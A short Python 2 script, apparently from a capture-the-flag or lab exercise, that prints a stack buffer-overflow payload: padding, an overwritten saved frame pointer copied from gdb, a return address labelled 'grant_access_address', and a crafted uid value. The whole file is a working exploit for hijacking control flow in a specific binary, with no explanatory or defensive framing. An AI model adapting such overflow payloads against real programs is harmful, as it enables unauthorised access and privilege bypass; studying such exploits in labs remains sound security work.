import struct

preamble = "A" * 12
edx = "BBBB"
c="CCCC"

ebp = struct.pack("I",0xffefffd8) #same as gdb before calling it
eip= struct.pack("I", 0x080492a2) #'\xa2\x92\x04\x08' grant_access_address
uid = "\xE8\x03\x00\x00"

print preamble + edx + c + ebp + eip + c + uid 
